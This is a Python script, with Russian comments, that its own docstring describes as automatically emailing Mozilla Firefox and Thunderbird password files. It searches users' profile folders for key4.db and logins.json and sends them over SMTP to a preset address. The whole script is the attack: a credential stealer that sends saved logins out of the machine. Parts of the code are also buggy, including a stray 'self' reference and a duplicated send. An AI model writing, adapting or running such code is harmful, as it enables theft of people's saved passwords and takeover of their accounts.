#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
Автоматическая отправка по почте файлов с паролями Mozilla Firefox и Mozilla Thunderbird.
"""

import sys
import os
import os.path

import email
import email.message
import smtplib

try:
    import rich.console
except ImportError:
    print(u'Not found rich library. Install: pip3 install rich')
    sys.exit(1)

__version__ = (0, 0, 0, 1)

CONSOLE = rich.console.Console()

FIND_PATHS = ('~/.mozilla/firefox', '~/.thunderbird')
FIND_FILENAMES = ('key4.db', 'logins.json')

# Конфигурационный файл
ENABLE = True

# Кодировка писем
ENCODE = 'utf-8'

# SMTP сервер
# SMTP_SRV = 'smtp.yandex.com'
SMTP_SRV = '10.0.0.8'
SMTP_PORT = 25

# Аутентификация на SMTP сервере
SMTP_LOGIN = ''
SMTP_PASSWORD = ''

# Параметры письма по умолчанию
FROM = '<xxx@xxx.ru>'
TO = ('<yyy@yyy.ru>', )
SUBJ = ''
BODY = ''

# Папка исходящих файлов
OUTBOX = './test'
DEL_FILES = False

# Режим записи в журнал действий
LOG_ENABLE = True


def send_mail(from_email=None, to_email=(), subject=None, body=None, files=(),
              smtp_server=None, smtp_server_port=None,
              username=None, password=None):
    """
    Функция отправки  письма. Если какой  параметр функции
    None, то этот параметр берется из конфигурационного файла.

    @param from_email: Адрес с которого отсылается письмо.
    @param to_email: Список адресов на которые отсылается письмо.
    @param subject: Тема письма.
    @param body: Тело письма.
    @param files: Список прикрепляемых файлов.
    @param smtp_server: SMTP сервер.
    @param smtp_server_port: Порт SMTP сервера, обычно 25.
    @param username: Логин на SMTP сервере.
    @param password: Пароль на SMTP сервере.
    """
    # Отправка писем выключена
    if not ENABLE:
        CONSOLE.print(u'Отправка писем выключена', style='green')
        return False
    
    # Проверка типов входных аргументов
    assert type(to_email) in (list, tuple)
    assert type(files) in (list, tuple)

    # Проверка корректности входных данных
    if not from_email:
        from_email = FROM
    if not to_email:
        to_email = TO
    if not subject:
        subject = SUBJ
    if not body:
        body = BODY
        
    if not smtp_server:
        smtp_server = SMTP_SRV
    if not smtp_server_port:
        smtp_server_port = SMTP_PORT
    if not username:
        username = SMTP_LOGIN
    if not password:
        password = SMTP_PASSWORD
        
    # Создать сообщение
    msg = email.message.EmailMessage()
    # msg = email.mime.MIMEMultipart.MIMEMultipart()
    # print 'DBG!!',dir(msg),msg.get_charset()
    # msg['From'] = self._encode(From_, 'utf-8', self.config_manager.email_encode)
    # msg['To'] = self._encode(email.Utils.COMMASPACE.join(To_), 'utf-8', self.config_manager.email_encode)
    msg['From'] = from_email
    msg['To'] = ','.join(to_email)
    # msg['Date'] = email.Utils.formatdate(localtime=True)
    msg['Subject'] = subject
    # msg.attach(email.MIMEText.MIMEText(self._encode(Body_, 'utf-8', self.config_manager.email_encode)))
    
    # Если файлы не определены, то посмотреть в папке исходящих файлов
    if not files:
        outbox_dir = self.config_manager.outbox_dir
        if os.path.isdir(outbox_dir):
            outbox_files = [os.path.join(outbox_dir, element) for element in os.listdir(outbox_dir) if os.path.isfile(os.path.join(outbox_dir, element))]
            files = outbox_files
            
    # Прикрепление файлов
    for filename in files:
        fp = open(filename, 'rb')
            # img_data = fp.read()
        msg.add_attachment(fp.read(),
                           maintype='application',
                           subtype='ctet-stream')

        # part = email.MIMEBase.MIMEBase('application', 'octet-stream')
        # part.set_payload(open(filename, 'rb').read())
        # email.Encoders.encode_base64(part)
        # part.add_header('Content-Disposition',
        #                 'attachment; filename="%s"' % os.path.basename(filename))
        # msg.attach(part)

        file_size = os.stat(filename).st_size
        CONSOLE.print(u'Файл "%s" (%s) прикреплен к письму' % (filename, file_size), style='green')
    
    # msg_txt = msg.as_string()
    # print 'DBG:::',msg_txt
    
    # Соединение с SMTP сервером и отправка сообщения
    try:
        # Send the email via our own SMTP server.
        smtp_srv = smtplib.SMTP(host=smtp_server, port=smtp_server_port)
        # smtp_srv.login(Login_, Password_)

        if username:
            smtp_srv.login(username, password)

        smtp_srv.send_message(msg)

        # smtp = smtplib.SMTP(SMTPServer_, SMTPServerPort_)
        # smtp.set_debuglevel(0)
        # # if ttls:
        # #    smtp.ehlo()
        # #    smtp.starttls()
        # #    smtp.ehlo()

        smtp_srv.send_message(msg)
        smtp_srv.close()

        CONSOLE.print(u'Письмо от %s к %s отправленно' % (from_email, to_email), style='green')
            
    except smtplib.SMTPException:
        CONSOLE.print_exception(u'Ошибка отправки письма')
        return False
        
    # if Files_ and self.config_manager.delete_files:
    #     # Удалить прикрепляемые файлы?
    #     for file_name in Files_:
    #         if os.path.exists(file_name):
    #             os.remove(file_name)
    #             if self.config_manager.log_enable:
    #                 print(u'Файл <%s> удален' % file_name)
    return True


def get_home_dir():
    """
    Папка HOME.
    """
    if sys.platform[:3].lower() == 'win':
        home_dir = os.environ['HOMEDRIVE']+os.environ['HOMEPATH']
        home_dir = home_dir.replace('\\', '/')
    else:
        home_dir = os.environ['HOME']
    return home_dir


def main(*argv):
    home_dir = get_home_dir()
    CONSOLE.print(u'Домашняя папка <%s>' % home_dir, style='green')

    find_filenames = list()
    for find_path in FIND_PATHS:
        find_path = find_path.replace('~', home_dir)
        for folder_name in os.listdir(find_path):
            find_filenames = [os.path.join(find_path, folder_name, filename) for filename in FIND_FILENAMES]
            find_filenames = [filename for filename in find_filenames if os.path.exists(filename)]

        if find_filenames:
            send_mail(subject=os.path.split(find_path)[-1], files=find_filenames)


if __name__ == '__main__':
    main(sys.argv)
